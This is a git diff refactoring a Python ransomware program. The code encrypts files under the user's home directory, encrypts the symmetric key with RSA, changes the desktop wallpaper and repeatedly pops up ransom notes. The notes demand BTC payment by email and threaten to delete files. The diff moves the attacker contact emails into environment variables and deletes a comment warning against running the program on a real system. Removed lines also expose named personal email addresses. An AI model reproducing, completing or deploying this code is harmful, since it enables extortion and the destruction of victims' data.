@@ -1,4 +1,4 @@
-# Local Imports
+# Python Imports
 import os
 import webbrowser
 import requests
@@ -14,14 +14,18 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 from dotenv import load_dotenv
 
+# Local Imports
+import utils
+
 load_dotenv()
 
 os.environ["CRYPTOGRAPHY_OPENSSL_NO_LEGACY"] = "1"
 
-PROJECT_NAME = os.getenv('PROJECT_NAME')
-DESKTOP_PATH = os.getenv('DESKTOP_PATH')
+PROJECT_PATH = os.getenv('PROJECT_PATH')
 ENCRYPT_C_DRIVE = os.getenv('ENCRYPT_C_DRIVE') == "True"
 ENCRYPTION_PATH = os.getenv('ENCRYPTION_PATH')
+PRIMARY_EMAIL = os.getenv('PRIMARY_EMAIL')
+SECONDARY_EMAIL = os.getenv('SECONDARY_EMAIL')
 
 PUBLIC_IP_API = 'https://api.ipify.org'
 
@@ -41,15 +45,9 @@ class RansomWare:
         # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
         self.public_key = None
 
-        ''' 
-        Root directory's to start Encryption/Decryption from
-        CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
-        CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
-        CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
-        '''
         # Use sysroot to create absolute path for files, etc. And for encrypting whole system
         self.sysRoot = os.path.expanduser('~')
-        print(self.sysRoot)
+        print(f"Sys Root: {self.sysRoot}")
 
         self.localRoot = f'{ENCRYPTION_PATH}'
         self.publicIP = requests.get(PUBLIC_IP_API).text
@@ -59,56 +57,17 @@ class RansomWare:
         """
         This function will change the desktop background.
         """
-        # path = r"C:\Users\Maaz\Documents\Python-Ransomware\bot.jpg"
-        path = f"{DESKTOP_PATH}\\{PROJECT_NAME}" + r'\bot.jpg'
+        path = f"{PROJECT_PATH}\\bot.jpg"
 
         spi_set_desktop_wallpaper = 20
+
         # Access windows dlls for functionality eg, changing desktop wallpaper
         ctypes.windll.user32.SystemParametersInfoW(spi_set_desktop_wallpaper, 0, path, 0)
 
     @staticmethod
-    def ransom_note():
-        """
-        This function will write the ransom note in the RANSOM_NOTE file.
-        """
-        with open('RANSOM_NOTE.txt', 'w') as f:
-            f.write(f'''
-                ** Your system have been encrypted with a Military grade encryption algorithm. **
-
-                ** There is no way to restore your data without a special key. **
-
-                Only we can decrypt your files!
-
-                To purchase your key and restore your data, please follow these three easy steps:
-
-                1. Email the file called EMAIL_ME.txt at C:\\Users\\Maaz\\Desktop\\EMAIL_ME.txt to 
-                maazsabahuddin@gmail.com
-
-                2. You will receive your personal BTC address for payment.
-                   Once payment has been completed, send another email to altamashkarlekar@gmail.com stating "PAID".
-                   We will check to see if payment has been paid.
-
-                3. You will receive a text file with your KEY that will unlock all your files. 
-                   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin 
-                   to decrypt all files.
-
-                WARNING:
-
-                - Do NOT attempt to decrypt your files with any software because that will not work, and may cost you 
-                more to unlock your files.
-
-                - Do NOT change file names, mess with the files, or run decryption software as it will cost you more 
-                to unlock your files and there is a high chance you will lose your files forever.
-
-                Do NOT send "PAID" button without paying, price WILL go up for disobedience.
-
-                Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay.
-            ''')
-
-    @staticmethod
     def show_ransom_note():
         """
-        This function will take care to pop up the ransom note continously.
+        This function will take care to pop up the ransom note continuously.
         """
         # Open the ransom note
         ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
@@ -175,7 +134,7 @@ class RansomWare:
             f.write(enc_fernet_key)
 
         # Write encrypted fernet key to the respective location.
-        with open(f'{DESKTOP_PATH}\\{PROJECT_NAME}' + r'\EMAIL_ME.txt', 'wb') as fa:
+        with open(f'{PROJECT_PATH}\\EMAIL_ME.txt', 'wb') as fa:
             fa.write(enc_fernet_key)
 
         # Assign self.key to encrypted fernet key
@@ -215,7 +174,7 @@ class RansomWare:
 
     def crypt_system(self, encrypted=False):
 
-        excluded_dirs = ['AppData', 'Local', r'Programs\Python']
+        excluded_dirs = ['AppData', 'Local', 'Programs\\Python']
         excluded_files = ['desktop.ini']
 
         # Walk through all directories and files in C:\Users
@@ -231,20 +190,20 @@ class RansomWare:
                     print(f"Error processing {file_path}: {e}")
 
     @staticmethod
-    def what_is_bitcoin():
+    def open_browser_note():
         # Define the file name
         filename = 'ransom.html'
 
         # URL of the image you want to display
-        image_url = f"{DESKTOP_PATH}\\{PROJECT_NAME}" + r"\bot.jpg"
+        image_url = f"{PROJECT_PATH}\\bot.jpg"
 
         # Define specific width and height for the image
         image_width = "400"  # Width in pixels
         image_height = "300"  # Height in pixels
 
         # Ransom note content
-        _ransom_note = """
-        <div class="ransom-note">
+        _ransom_note = f"""
+        <div class='ransom-note'>
             <h2>Your system has been encrypted with a Military-grade encryption algorithm.</h2>
             <h2>There is no way to restore your data without a special key.</h2>
 
@@ -253,10 +212,12 @@ class RansomWare:
             <p>To purchase your key and restore your data, please follow these three easy steps:</p>
 
             <ol>
-                <li>Email the file called EMAIL_ME.txt at C:\\<Project>\\EMAIL_ME.txt to maazsabahuddin@gmail.com</li>
+                <li>Email the file called EMAIL_ME.txt at {PROJECT_PATH} to {PRIMARY_EMAIL}
+                
                 <li>You will receive your personal BTC address for payment. Once payment has been completed, send 
-                another email to altamashkarlekar@gmail.com stating "PAID". We will check to see if payment has been 
+                another email to {SECONDARY_EMAIL} stating "PAID". We will check to see if payment has been 
                 paid.</li>
+                
                 <li>You will receive a text file with your KEY that will unlock all your files. IMPORTANT: To decrypt 
                 your files, place the text file on the desktop and wait. Shortly after it will begin to decrypt all 
                 files.</li>
@@ -266,9 +227,12 @@ class RansomWare:
             <ul>
                 <li>Do NOT attempt to decrypt your files with any software because that will not work, and may cost you 
                 more to unlock your files.</li>
+                
                 <li>Do NOT change file names, mess with the files, or run decryption software as it will cost you more 
                 to unlock your files and there is a high chance you will lose your files forever.</li>
+                
                 <li>Do NOT send "PAID" button without paying, the price WILL go up for disobedience.</li>
+                
                 <li>Do NOT think that we won't delete your files altogether and throw away the key if you refuse to 
                 pay.</li>
             </ul>
@@ -333,8 +297,8 @@ def main():
     rw.write_key()
     rw.encrypt_fernet_key()
     rw.change_desktop_background()
-    rw.what_is_bitcoin()
-    rw.ransom_note()
+    rw.open_browser_note()
+    utils.ransom_note(file_path=PROJECT_PATH, primary_email=PRIMARY_EMAIL, secondary_email=SECONDARY_EMAIL)
 
     t1 = threading.Thread(target=rw.show_ransom_note)
     t2 = threading.Thread(target=rw.put_me_on_desktop)
